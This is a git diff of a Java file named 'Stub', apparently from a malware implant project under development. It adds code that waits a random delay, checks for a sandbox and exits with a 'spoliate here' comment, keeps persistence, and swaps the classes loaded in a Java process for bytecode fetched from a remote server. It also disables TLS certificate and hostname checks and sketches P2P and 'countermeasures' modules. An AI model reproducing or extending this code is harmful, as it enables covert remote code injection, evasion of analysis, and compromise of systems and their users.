@@ -18,6 +18,7 @@ import java.lang.reflect.Method;
 import java.lang.instrument.ClassDefinition;
 import java.lang.instrument.Instrumentation;
 import java.lang.instrument.UnmodifiableClassException;
+import java.lang.invoke.MethodHandles;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.Hashtable;
@@ -105,18 +106,22 @@ public class Stub
     static public String envVar = "_JAVA_OPTIONS";
     static public String jarPath = "";
     static public boolean isAgent = true;
+    static public String currentClass = "";
     static public int virtThreshold = 10; //5 for when it's ready
     static private iAgent.security secInst = new iAgent.security();
 
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java
+    //cd src\main\java
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\lib\stub.jar ..\..\..\MANIFEST.txt .\com\nocebo\nCore\*.class
     public static void main(String[] args) throws IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
     {
-        Class currentClass = Class.forName("Stub");
+        Class currentClass = MethodHandles.lookup().lookupClass();
         passThroughJar(getObfuscatedName(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()),args);
         isAgent = false;
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
         //for attach execution
-        coreOp(new ArrayList());
+        coreOp();
     }
 
     public static void premain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
@@ -124,9 +129,20 @@ public class Stub
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
         //for attach execution
-        ArrayList containsInst = new ArrayList();
-        containsInst.add(inst);
-        coreOp(containsInst);
+        coreOp();
+
+        Class currentClass = MethodHandles.lookup().lookupClass();
+        Class[] loadedClassSet = getLoadedClasses(inst);
+        for (int c=0;c<loadedClassSet.length;c++)
+        {
+            Class originalDef = (Class) loadedClassSet[c];
+            if (!originalDef.getCanonicalName().contains(getPackageName(currentClass.getCanonicalName())))
+            {
+                byte[] classBytes = classRequest(originalDef.getCanonicalName());
+                inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
+            }
+        }
+        iAgent.init();
     }
 
     public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
@@ -134,17 +150,28 @@ public class Stub
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
         //for attach execution
-        ArrayList containsInst = new ArrayList();
-        containsInst.add(inst);
-        coreOp(containsInst);
+        coreOp();
+
+        Class currentClass = MethodHandles.lookup().lookupClass();
+        Class[] loadedClassSet = getLoadedClasses(inst);
+        for (int c=0;c<loadedClassSet.length;c++)
+        {
+            Class originalDef = (Class) loadedClassSet[c];
+            if (!originalDef.getCanonicalName().contains(getPackageName(currentClass.getCanonicalName())))
+            {
+                byte[] classBytes = classRequest(originalDef.getCanonicalName());
+                inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
+            }
+        }
+        iAgent.init();
     }
 
-    public static void coreOp(ArrayList containsInst) throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
+    public static void coreOp() throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
     {
         
         if (!chkSandbox())
         {
-            Class currentClass = Class.forName("Stub");
+            Class currentClass = MethodHandles.lookup().lookupClass();
             jarPath = currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
 
             //chk for persistence and add if not present
@@ -159,22 +186,19 @@ public class Stub
                 System.exit(0);                
             }
 
-            Instrumentation inst = (Instrumentation) containsInst.get(0);
-
-            Class[] loadedClassSet = getLoadedClasses(inst);
-            for (int c=0;c<loadedClassSet.length;c++)
-            {
-                Class originalDef = (Class) loadedClassSet[c];
-                if (!originalDef.getCanonicalName().toLowerCase().contains("stub"))
-                {
-                    byte[] classBytes = classRequest(originalDef.getCanonicalName());
-                    inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
-                }
-            }
         }
+        else
+        {
+            //spoliate here
+            System.exit(0);
+        }
+    }
 
-        iAgent.init();
-        //implicit else: done
+    public static String getPackageName(String canonicalPath)
+    {
+        String[] classCanonical = canonicalPath.split(".");
+        String[] packageNameElements = Arrays.copyOfRange(classCanonical,0,classCanonical.length-1);
+        return String.join(".",packageNameElements);
     }
 
     public static void passThroughJar(String pathToJar, String[] initArgs)
@@ -315,7 +339,7 @@ public class Stub
 
             if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
             {
-                String nonceData = connMan.getHeaderField("set-cookie").split("=")[1];
+                String nonceData = connMan.getHeaderField("uuid").substring(0,12).replace("-","");
                 BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                 String responseData = connInReader.readLine();
                 connInReader.close();
@@ -433,10 +457,84 @@ public class Stub
 
 class iAgent
 {
+    static private security secInst = new security();
+
     public static void init()
     {
 
     }
+
+    public static class runnableThread implements Runnable
+    {
+        public void run()
+        {
+        }
+    }
+
+    private static class pkgLib extends ClassLoader 
+    {
+
+    }
+
+    public static class utilitarian
+    {
+
+    }
+
+    public static class P2PServer
+    {
+
+    }
+
+    public interface P2PInterface extends Remote
+    {
+
+    }
+
+    public static class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
+    {
+        P2PSrvImpl() throws RemoteException
+        {
+            super();
+        }
+    }
+
+    public static class network
+    {
+        private String request(String postData, String endpointType) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
+        {
+            HostnameVerifier allHostsValid = new HostnameVerifier() {
+                public boolean verify(String hostname, SSLSession session) {
+                return true;
+            }
+            };
+            return new String();
+        }
+
+
+        public class InvalidCertificateTrustManager implements X509TrustManager
+        {
+            @Override
+            public X509Certificate[] getAcceptedIssuers() {
+                return null;
+            }
+
+            @Override
+            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
+
+            }
+
+            @Override
+            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
+            }
+        }
+    }
+
+    private static class countermeasures 
+    {
+
+    }
+    
 
     static class security
     {
